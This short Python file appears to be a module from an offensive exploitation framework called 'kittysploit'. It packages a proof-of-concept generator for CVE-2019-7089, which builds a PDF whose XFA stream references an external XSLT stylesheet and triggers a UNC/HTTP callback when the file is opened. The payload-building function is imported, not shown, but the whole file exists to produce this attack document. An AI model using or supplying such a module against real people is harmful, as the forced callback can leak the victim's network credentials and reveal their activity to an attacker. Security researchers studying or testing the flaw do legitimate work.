#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.xfa import write_xfa_xslt_callback


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2019-7089 XFA XSLT Callback',
        "description": 'Generate PDF PoC for CVE-2019-7089: external XSLT stylesheet reference in XFA stream triggering UNC/HTTP callback on open.',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2019-7089'],
        "references": ['https://insert-script.blogspot.com/2019/01/adobe-reader-pdf-callback-via-xslt.html'],
        "tags": ['pdf', 'cve-2019-7089', 'xfa', 'xslt', 'acrobat'],
    }

    PDF_GENERATORS = (
        write_xfa_xslt_callback,
    )

    CVE_IDS = ['CVE-2019-7089']
    MODULE_TITLE = 'PDF CVE-2019-7089 XFA XSLT Callback'

    def run(self):
        return self.run_pdf_cve()